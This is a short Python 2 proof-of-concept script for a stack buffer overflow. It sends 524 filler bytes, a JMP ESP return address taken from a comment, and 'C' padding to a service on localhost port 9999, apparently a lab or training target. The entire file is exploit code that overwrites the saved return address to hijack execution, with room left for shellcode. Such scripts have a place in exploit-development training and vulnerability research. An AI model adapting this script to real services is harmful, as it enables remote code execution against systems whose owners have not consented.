#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
#JMP ESP Value is 311712F3
buffer = '\x41'*524 + '\xF3\x12\x17\x31' + '\x43'*(1600-524-4)

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()